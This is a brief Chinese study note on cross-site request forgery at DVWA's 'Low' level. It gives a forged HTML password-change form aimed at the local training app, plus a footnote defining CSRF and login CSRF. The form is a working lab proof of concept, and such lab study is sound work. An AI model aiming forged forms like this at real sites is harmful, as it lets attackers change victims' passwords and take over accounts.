## DVWA中的CSRF攻击 [^1]

### Low

截取修改密码表单，保存到新的html文件

```php+HTML
<form action="http://127.0.0.1/dvwa/vulnerabilities/csrf/?" methon="GET">
    New password:<br />
    <input type="password" AUTOCOMPLETE="off" name="password_new" value="hacker"><br />
    Confirm password:<br />
     <input type="password" AUTOCOMPLETE="off" name="password_conf" value="hacker"><br />
    <br />
    <input type="submit" value="Change" name="Change">
</form>
```

[原文](https://www.hackingarticles.in/csrf-attack-in-dvwa/)

---

[^1]: 跨站点请求伪造，也称为一键攻击或会话骑行，缩写为CSRF（有时发音为sea-surf）或XSRF，是一种恶意利用网站，其中未经授权的命令从用户传输网站信任。与利用用户对特定站点的信任的跨站点脚本（XSS）不同，CSRF利用站点在用户浏览器中的信任。攻击者可能会使用攻击者的凭据伪造将受害者登录到目标网站的请求; 这称为登录CSRF。登录CSRF可以进行各种新颖的攻击; 例如，攻击者可以稍后使用其合法凭据登录该站点并查看私人信息。